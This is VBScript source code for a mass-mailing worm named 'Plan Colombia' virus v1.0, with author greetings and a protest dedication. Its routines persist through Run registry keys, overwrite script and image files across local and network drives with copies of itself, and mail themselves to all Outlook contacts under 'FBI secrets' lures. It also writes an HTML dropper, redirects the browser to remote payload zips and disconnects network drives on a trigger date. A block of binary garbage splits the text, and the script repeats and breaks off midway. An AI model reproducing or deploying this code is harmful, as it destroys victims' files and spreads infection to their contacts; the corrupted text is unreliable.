rem  ===============================================================================================
rem  "Plan Colombia" virus v1.0
rem  by Sand Ja9e Gr0w   (www.colombia.com)

rem  Dedicated to all the people that want to be hackers or crackers, in Colombia  
rem  This program is also a protest act against the violence and corruption that Colombia lives...
rem  I always wanting that all this finishes, I have said...


rem  Santa fe de Bogotá 2000/09
rem  I dedicate to all you the song "GoodBye" of Andreas Bochelli
rem  =================================================================================================


rem  Thanks God..!
rem  A greeting for "Lina María" from "Santa fe de Bogotá"
rem  A greeting for "Tizo" from "Spain"
rem  And One kicked of tail to my friends, "eL ChE" and "ThE SpY"

rem  okay, ok... 
rem  my baby start here...

 
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow,polyn,numero,polye
eq=""
ctr=0

randomize
numero = Int(Rnd * 3) + 1
polye = ".GIF.vbs"
If numero = 1 Then
  polye = ".BMP.vbs"
 Else
  If numero = 2 Then
    polye = ".JPG.vbs"
  End If
End If


polyn="\"&polyname(Int(Rnd * 5) + 4)&polye

Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
If Day(Now) = 17 And Month(Now) = 9 Then
  MsgBox "Dedicated to my best brother=>Christiam Julian(C.J.G.S.)" & Chr(13) & "Att.  " & polyname(5) & "   (M.H.M. TEAM)"
  killnet()
End If



sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
 wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\LINUX32.vbs")
c.Copy(dirwin&"\reload.vbs")
c.Copy(dirsystem&polyn)
regruns()
html()
spreadtoemail()
listadriv()
end sub



sub regruns()
On Error Resume Next
Dim num,downread,res
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\LINUX32",dirsystem&"\LINUX32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\reload",dirwin&"\reload.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
  downread="c:\"
end if

rem   acepta nombres largos..?
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
  Randomize
  Randomize
  num = Int((4 * Rnd) + 1)

  rem  fatal => send virii
  if num = 2 then 
    regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/macromedia32.zip"
   else
    rem  oh,, a picture.. nice :)  
    if num = 3 then
        regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux321.zip"       
      else
       rem  oh,, other picture  =:()
       if num = 4 then
         regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux322.zip"
       end if 
    end if  
 end if
end if

if (fileexist(downread&"\MACROMEDIA32.zip")=0) then
  res = Shell("copy " & downread & "\MACROMEDIA32.zip  " & dirwin & "\important_note.txt", vbHide)
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\plan colombia",dirwin&"\important_note.txt"
  regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
 else
  if (fileexist(downread&"\linux321.zip")=0) then
     Kill (dirwin & "\logos.sys")
     res = Shell("copy " & downread & "\linux321.zip  " & dirwin & "\logos.sys", vbHide)
     regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
    else
      if (fileexist(downread&"\linux322.zip")=0) then
        Kill (dirwin & "\logow.sys")
        res = Shell("copy " & downread & "\linux322.zip  " & dirwin & "\logow.sys", vbHide)  
        regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
      end if   
  end if
end if
end sub



sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives

For Each d in dc
 If d.DriveType = 2 or d.DriveType=3 Then
  folderlist(d.path&"\")
 end if
Next

listadriv = s
end sub



sub infectfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files

for each f1 in fc
 ext=fso.GetExtensionName(f1.path)
 ext=lcase(ext)
 s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
 else
  if(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct")  or (ext="hta") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   bname=fso.GetBaseName(f1.path)
   set cop=fso.GetFile(f1.path)
   cop.copy(folderspec&"\"&bname&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="jpg") or (ext="jpeg") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   set cop=fso.GetFile(f1.path)
   cop.copy(f1.path&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="mp3") or (ext="mp2") then
   set mp3=fso.CreateTextFile(f1.path&".vbs")
   mp3.write vbscopy
   mp3.close
   set att=fso.GetFile(f1.path)
   att.attributes=att.attributes+2
 end if
 end if
 end if
end if
next

end sub



sub folderlist(folderspec)
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders

for each f1 in sf
 infectfiles(f1.path)
 folderlist(f1.path)
next

end sub


sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub


function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function


function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
  msg = 0
else
  msg = 1
end if
fileexist = msg
end function


function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
 msg = 0
else
 msg = 1
end if
fileexist = msg
end function



sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,correoad,b,regedit,regv,regad,textosub,textobod

set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")

Randomize
numero = Int(Rnd * 3) + 1
textosub = ""
If numero = 1 Then
  textosub = "US PRESIDENT AND FBI SECRETS =PLEASE VISIT => (http://WWW.2600.COM)<="
 Else
  If numero = 2 Then
    textosub = polyname(6)
  End If
End If


Randomize
numero = Int(Rnd * 3) + 1
textobod = ""
If numero = 1 Then
  textobod = "VERY JOKE..! SEE PRESIDENT AND FBI TOP SECRET PICTURES.."
 Else
  If numero = 2 Then
    textobod = polyname(10)
  End If
End If


for ctrlists=1 to mapi.AddressLists.Count
 set a=mapi.AddressLists(ctrlists)
 x=1
 regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
 if (regv="") then
 regv=1
 end if
 if (int(a.AddressEntries.Count)>int(regv)) then
 
  for ctrentries=1 to a.AddressEntries.Count
   correoad=a.AddressEntries(x)
   regad=""
   regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad)
   if (regad="") then
     set correo=out.CreateItem(0)
     correo.Recipients.Add(correoad)
     correo.Subject = textosub
     correo.Body = vbcrlf&textobod
     correo.Attachments.Add(dirsystem&polyn)
     correo.Send
     regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad,1,"REG_DWORD"
   end if
     x=x+1
  next

  regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
 else
   regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next

Set out=Nothing
Set mapi=Nothing
end sub


Function polyname(n)
Dim i, vector, texto, pos
on error resume next
rem polyformic ( ohhhh yeahhh...) very good polyformic engine  :() by Sand Ja9e Gr0w

vector = Array("A", "E", "I", "O", "U")
texto = ""
Randomize
For i = 1 To n
  Randomize
  rem  consonante
  texto = texto&Chr(Int((Rnd * 25) + 65))
  i = i + 1
  If i > n Then
   exit for
  end if
  rem  vocal
  texto = texto&vector(Int((Rnd * 4) + 1))
  Randomize
Next

polyname = texto
End Function




sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD>"&_
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>M.H.M TEAM <?-?p><p>Colombia<BR>- Please press #-#YES#-# button for see secret pictures<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>Hello Colombia...! Since Here, after, since other part of World..<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"&vbcrlf& _
  "<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
  "<!--"&vbcrlf& _
  "on error resume next"&vbcrlf& _
  "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
  "aw=1"&vbcrlf& _
  "code="

  dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
  "set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
  "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
  "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
  "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
  "set wri=fso.CreateTextFile(dirsystem&@-@^-^LINUX32.vbs@-@)"&vbcrlf& _
  "wri.write code4"&vbcrlf& _
  "wri.close"&vbcrlf& _
  "if (fso.FileExists(dirsystem&@-@^-^LINUX32.vbs@-@)) then"&vbcrlf& _
  "if (err.number=424) then"&vbcrlf& _
  "aw=0"&vbcrlf& _
  "end if"&vbcrlf& _
  "if (aw=1) then"&vbcrlf& _
  "document.write @-@ERROR: can#-#t load Pictures. IE internal Error@-@"&vbcrlf& _
  "window.close"&vbcrlf& _
  "end if"&vbcrlf& _
  "end if"&vbcrlf& _
  "Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
  "regedit.RegWrite  @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^LINUX32@-@,dirsystem&@-@^-^LINUX32.vbs@-@"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"

  dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
  dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
  dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
  dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
  dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
  dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
  dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
  dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
  set fso=CreateObject("Scripting.FileSystemObject")
  set c=fso.OpenTextFile(WScript.ScriptFullName,1)
  lines=Split(c.ReadAll,vbcrlf)
  l1=ubound(lines)

  for n=0 to ubound(lines)
    lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
    lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
    lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
    if (l1=n) then
      lines(n)=chr(34)+lines(n)+chr(34)
     else
      lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
   end if
  next

  set b=fso.CreateTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM")
  b.close
  set d=fso.OpenTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM",2)
  d.write dt5
  d.write join(lines,vbcrlf)
  d.write vbcrlf
  d.write dt6
  d.close
end sub



sub killnet()
Dim intDrive,strDrive,WSHNetwork

on error resume next


Set WSHNetwork = WScript.CreateObject("WScript.Network")

    For intDrive = 26 To 5 Step -1       
               strDrive = Chr(intDrive + 64) & ":"        
               WSHNetwork.RemoveNetworkDrive strDrive
    Next

rem  bye net connection ...                 :-(
Set WSHNetwork=Nothing

end sub
                                                                                                                     R1VRRSVrRsN”VµVÔZÓ^´bµbµ^Öb¶fÖj÷f÷jkg9gZoZk{oZsyošsºwº{»{½{Ş{üûÚ¹{¹˜˜{xww{VwWsWoxoXko9s6s5sso6ok7kcc÷b×b÷^ÖZöbgôfôjônÔfÓb²b‘^²Z³Z”Z”bsZsV’R‘ZrZR^RZ1^VïYR.N/RPRqRqVpZPVRN1J1F0FPJrNRJBïEFBï=Î9Î=í=ÏA®AJ/JJ]Iç@ôb{wœsœwÅæ ˜wwwæ«=k%(%!ç k11N­99kïA­=ÎAïIl9l5       Ô  [	  ¿    „  û    & 3 @; Pûÿï;5ï`ûÿ;;;;pûÿ;ôô;€»ÿëõ5ôô;ì»ÿCM5;;5Cğ »ÿC555$°»şQOMQ(À{ıÀ;ş;;5ôĞ¦¹(;5Ğ;ı¹O(ôôô;;<ôõS§¨âóô5à;ıSâMôô;ô5ô<ô<<<ô<ô;5ğ;ıSšÊ;;;5ô;;<;ô<ô<<;5;;;5 <ıC~E;;55;;<;;;ô<ô;ô<K<;üü !5ô;55;<<ôô<<ôô<ô!<ô üü;<55ô;555<<<<<<ô;;;ôôK;0üü5;5;5ô;555<<<<<<;5555ô<;@üü5;ôô;;;555ô<<<<<;<ô5;!<;P<ıô<;5555;ô<<<<ô<!;5<<<;ô`¼ı5;ô;<<<<;ô<;ô<<ô<;p¼ş5;ô;ô<<ô;ôô;<ôô<ô5€¼ş5ô;ô<<ô<ôô;;ôô<<ô;5¼ş<;;ôô;ô<!ô5ô<<<<ôôô üş5ô<ô;;ô<<!;ô<<ôôôôHN:°üş5ô<!<KK<<ô;55ôôô<<!øøP&Àüş(Aÿ!KK<K<<<<òÀü;<GKGÊSĞ¼şôIÙÙssüáàüG"òĞü<"PÂËà<ş;õ!İ!İ|y"ÓŞ×<!à¼$ĞËğüı5ô5H°Øİ×ÑIKI!Ş"ğüSE ½ıô;txsÙŞÀ÷ûF*}ı5555;<ô<"AFFA <ô; =ıôô!;5555;5;;!<;0=ı;55ôô<5ô;55;5;ô!<;5@=ıôô5ôô;ô;ô55;ô<;;555Pıü5;ôôôô;;ô5P=5;;ôô;5`½ü;ôôôôô5`½;ô;ô5
p½ü5;ôôôôôp=;ô;;	€½ü;ôôôô<;€½ÿ€};ôô;;½ü;;ôô<ô};ô;; ½üô;;;;; ½ÿ ½5;;;	°}üô;;;;°½;;;À}üòôôô<KÀıô;;Ğ}ü"sÙööúĞı<  à}ü5Jz­Øø"à=öúÑğ}üÜØG5;ğ=KİÜ; ¾ü; >5I<>ı5!> >ı5K >	0>ı550~6@şüë	Pşü	6`şüÿÿ    4 0{ @ûÿPûÿ5;;5`ûÿ;ôô5p;ÿp»ÿôôô;€ûşEºÊSï;;;5$»şD¨&ÊË#5;5Sì »şSºÂÊC)#&°ûı55óNµº)(Ëº¹Ëï5À»ı5ô<<;)ó;(·ššÏ;ô5;5Ğ;ıôôô<;5ôôôEÌT ôô5!GI ôô;àûü5ôô;ôô5ô<ô<<<<<ô55;ô;;ôôğûü5;ôôô;;<ô;ôô<<;;ô!<;5;ô5 üü5ôô5ô;<<ôô<<<;ô<ôô<;5;5<ı5ô<;555<<<<<<<ôô;ô!!<;5 <ı;<;;55<<<<<<ô55;ô!!<;0|ı;<;;55ô<<<<<ô5ôôô!!<;@üı;;;;;ô<<<<<;<ôôô<<ôP|ş;;;<ô<<<<<ô!;5<<`|ş5;;ô;<<<<ô;ô5ô;p|ş5;<ô;<<<;ôô55€¼ş5;ôôô<<ôô<<ô5¼ş5ôô;ô<ôôô!<5 ¼ş5ô!<;ôô<<<;5°¼ş;ô!J!!K!!<;5ÀüşK<KK!KK<ô  Ğüş;öÙüÒ÷ŞÙsÙHÿ à|ş5<İ5Ò{{ ÑÓİ<ô55ğ<ş5ôòú|İÜØøIKİ!sJ5;; ıı;<55 w{yŞ"±{ÒH 55½ı;;5;ô!AFF@şFAA<ô;5 }ı5;;<ô;55555;ô<<ô0=ı;;5!;<ôô5;;;<!ô;5@ıü;ô;5ô!Kô;55;5<<ô5;555Pıüô<ô55;ô;5;;;;;5;`ıü;<ôô5`}5ôô55;;	pıü55ô<ôô	p=ôôô5€ıü;<ôôô€}ô<ô5ıü5ôôô<;}ô<ôô ıü;ôô<< }5<<ô5°ıü;ô<<ô°½ô<<;À½ü5ôôôôÀ½5ôô;Ğ½ü;ôôô"Ğıôôôà}üò  ö øàı<  òğ}üössG*ğ=GúyG ~üõÜŞs ; >òÜİK~üõõ55 > şü5J >0şü5ò0~@şü	@şPşü	`şüÿÿ  " 3 @» P{ 55ë`{ 5;;5p{ ;ôô;€; ;ôô;; DE5;;5CC {ÿ&Q555ïQC »#Ë°;ÿ5ô5)QOPQì¹Â·Ğ:À;ÿ;<ô5ï¹™›Ê(ÊĞÊĞ;ÿ;;ôôôEsPô#¥¦¹àûş;5;ô<<<55;CÊÂ·¥Eğûş5;5;<<<;;;5%S´¥( üş5ôôôô<<;;;ôô5EÊVô¼ş5ôôôô<ô;ô!!<ô5Bğöôô; ¼ş;ôô<<;ôôôô<K;5  ô<<ô0üş;ôô<<;ô;;ô!!<ô<<!<<;@üş;ôô<ô<Kô;;!K!<<ô<<<;Püş;ôô<;!!<;ô!K!<<ôôô<5`<ÿ;ô<;5!<ô;ô<!!ôô;;;;p<ÿ5ôô55ô;5;;;;;;€<ÿô55;ô;555<ÿ555;;!!;55 üş;55;ôô;<ô;55°üş*5ô!ôôô;;ôô;5ÀüşHò<<ôôôôô;;5Ğ¼şõørHİJJK<<ôôôà<ş<!!GA÷tıÙúüGGôğüı;<<;ÙÓİ |±5øøø<ô ½ı5;;55 tú×ÓÜİÜİK× =ı5;5;;; HüWFxuW^ûõ ıü555;;<555;;õ5;ô<ô;0½ü555;5<5ô;;5555;<ôô@½ü55ô<;55ô<K<5555;;;ô5P½ü;;;<ôô5;ôô5;55;;5`½üô<5ôôôô`}5ôô;ô5
p½ü;ôôôô<ô
pıô<ô5ô
€}ü5;ôô<<;€}ô<<5
}üô;ôô<<};<<ô ½ü5ôôôôô };<<<;°½ü;ôôôô;°½<<<ôÀ½ü<<<<!<À½;<<ôĞ}üÿAÿGösõĞıôôôà}ü<Ò‚½HúøàıG!<ôğ=üİÓKŞÿôğ=GÙÙs >ü K<; >úØØ<şü<J>5   şü;I >6	0şü!0¾96@şüë6@şP¾ü	`şüÿÿ  # 3 @» :P{ ï;5`{ ;ôô5p{ ;ôô;€; (;;ô5
»ÿÊC5;;Ê&»âË ;ÿ;5$C5)$Q {CµĞ¥S°;ÿôô5#¹ÂÏQ¨ËµÂÀ;ÿ5<;;5C¨ŸÂC5õĞš›§¶CĞûş5;;ôôô"<;55RËÎ¨¥Qàûş555ô<!ô5;;
à»ìÊµ¥(ğûş55;ô<<5;;55DË·Vô ¼ş;;;ô<ô5;ô<<;5;CCAôô;:¼ş5;;ô<;;ô!<<!555õ ôô<5 ¼ş5;;ô<;;;;;<!rem  ===============================================================================================
rem  "Plan Colombia" virus v1.0
rem  by Sand Ja9e Gr0w   (www.colombia.com)

rem  Dedicated to all the people that want to be hackers or crackers, in Colombia  
rem  This program is also a protest act against the violence and corruption that Colombia lives...
rem  I always wanting that all this finishes, I have said...


rem  Santa fe de Bogotá 2000/09
rem  I dedicate to all you the song "GoodBye" of Andreas Bochelli
rem  =================================================================================================


rem  Thanks God..!
rem  A greeting for "Lina María" from "Santa fe de Bogotá"
rem  A greeting for "Tizo" from "Spain"
rem  And One kicked of tail to my friends, "eL ChE" and "ThE SpY"

rem  okay, ok... 
rem  my baby start here...

 
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow,polyn,numero,polye
eq=""
ctr=0

randomize
numero = Int(Rnd * 3) + 1
polye = ".GIF.vbs"
If numero = 1 Then
  polye = ".BMP.vbs"
 Else
  If numero = 2 Then
    polye = ".JPG.vbs"
  End If
End If


polyn="\"&polyname(Int(Rnd * 5) + 4)&polye

Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
If Day(Now) = 17 And Month(Now) = 9 Then
  MsgBox "Dedicated to my best brother=>Christiam Julian(C.J.G.S.)" & Chr(13) & "Att.  " & polyname(5) & "   (M.H.M. TEAM)"
  killnet()
End If



sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
 wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\LINUX32.vbs")
c.Copy(dirwin&"\reload.vbs")
c.Copy(dirsystem&polyn)
regruns()
html()
spreadtoemail()
listadriv()
end sub



sub regruns()
On Error Resume Next
Dim num,downread,res
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\LINUX32",dirsystem&"\LINUX32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\reload",dirwin&"\reload.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
  downread="c:\"
end if

rem   acepta nombres largos..?
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
  Randomize
  Randomize
  num = Int((4 * Rnd) + 1)

  rem  fatal => send virii
  if num = 2 then 
    regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/macromedia32.zip"
   else
    rem  oh,, a picture.. nice :)  
    if num = 3 then
        regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux321.zip"       
      else
       rem  oh,, other picture  =:()
       if num = 4 then
         regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux322.zip"
       end if 
    end if  
 end if
end if

if (fileexist(downread&"\MACROMEDIA32.zip")=0) then
  res = Shell("copy " & downread & "\MACROMEDIA32.zip  " & dirwin & "\important_note.txt", vbHide)
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\plan colombia",dirwin&"\important_note.txt"
  regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
 else
  if (fileexist(downread&"\linux321.zip")=0) then
     Kill (dirwin & "\logos.sys")
     res = Shell("copy " & downread & "\linux321.zip  " & dirwin & "\logos.sys", vbHide)
     regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
    else
      if (fileexist(downread&"\linux322.zip")=0) then
        Kill (dirwin & "\logow.sys")
        res = Shell("copy " & downread & "\linux322.zip  " & dirwin & "\logow.sys", vbHide)  
        regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
      end if   
  end if
end if
end sub



sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives

For Each d in dc
 If d.DriveType = 2 or d.DriveType=3 Then
  folderlist(d.path&"\")
 end if
Next

listadriv = s
end sub



sub infectfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files

for each f1 in fc
 ext=fso.GetExtensionName(f1.path)
 ext=lcase(ext)
 s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
 else
  if(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct")  or (ext="hta") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   bname=fso.GetBaseName(f1.path)
   set cop=fso.GetFile(f1.path)
   cop.copy(folderspec&"\"&bname&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="jpg") or (ext="jpeg") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   set cop=fso.GetFile(f1.path)
   cop.copy(f1.path&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="mp3") or (ext="mp2") then
   set mp3=fso.CreateTextFile(f1.path&".vbs")
   mp3.write vbscopy
   mp3.close
   set att=fso.GetFile(f1.path)
   att.attributes=att.attributes+2
 end if
 end if
 end if
end if
next

end sub



sub folderlist(folderspec)
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders

for each f1 in sf
 infectfiles(f1.path)
 folderlist(f1.path)
next

end sub


sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub


function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function


function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
  msg = 0
else
  msg = 1
end if
fileexist = msg
end function


function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
 msg = 0
else
 msg = 1
end if
fileexist = msg
end function



sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,correoad,b,regedit,regv,regad,textosub,textobod

set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")

Randomize
numero = Int(Rnd * 3) + 1
textosub = ""
If numero = 1 Then
  textosub = "US PRESIDENT AND FBI SECRETS =PLEASE VISIT => (http://WWW.2600.COM)<="
 Else
  If numero = 2 Then
    textosub = polyname(6)
  End If
End If


Randomize
numero = Int(Rnd * 3) + 1
textobod = ""
If numero = 1 Then
  textobod = "VERY JOKE..! SEE PRESIDENT AND FBI TOP SECRET PICTURES.."
 Else
  If numero = 2 Then
    textobod = polyname(10)
  End If
End If


for ctrlists=1 to mapi.AddressLists.Count
 set a=mapi.AddressLists(ctrlists)
 x=1
 regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
 if (regv="") then
 regv=1
 end if
 if (int(a.AddressEntries.Count)>int(regv)) then
 
  for ctrentries=1 to a.AddressEntries.Count
   correoad=a.AddressEntries(x)
   regad=""
   regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad)
   if (regad="") then
     set correo=out.CreateItem(0)
     correo.Recipients.Add(correoad)
     correo.Subject = textosub
     correo.Body = vbcrlf&textobod
     correo.Attachments.Add(dirsystem&polyn)
     correo.Send
     regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad,1,"REG_DWORD"
   end if
     x=x+1
  next

  regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
 else
   regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next

Set out=Nothing
Set mapi=Nothing
end sub


Function polyname(n)
Dim i, vector, texto, pos
on error resume next
rem polyformic ( ohhhh yeahhh...) very good polyformic engine  :() by Sand Ja9e Gr0w

vector = Array("A", "E", "I", "O", "U")
texto = ""
Randomize
For i = 1 To n
  Randomize
  rem  consonante
  texto = texto&Chr(Int((Rnd * 25) + 65))
  i = i + 1
  If i > n Then
   exit for
  end if
  rem  vocal
  texto = texto&vector(Int((Rnd * 4) + 1))
  Randomize
Next

polyname = texto
End Function




sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD>"&_
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
